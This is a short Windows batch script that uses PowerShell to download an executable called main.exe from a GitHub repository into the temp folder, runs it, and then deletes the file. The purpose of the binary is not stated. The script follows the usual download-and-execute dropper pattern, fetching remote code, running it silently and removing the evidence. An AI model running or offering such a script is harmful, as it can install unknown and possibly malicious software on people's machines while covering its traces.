@echo off
set temp_dir=%temp%
set file_name=main.exe
set url=https://github.com/8msv/emp/raw/main/%file_name%

echo Downloading %file_name%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%temp_dir%\%file_name%')"

echo Running %file_name%...
start /wait %temp_dir%\%file_name%

echo Deleting %file_name%...
del /q %temp_dir%\%file_name%

echo Done.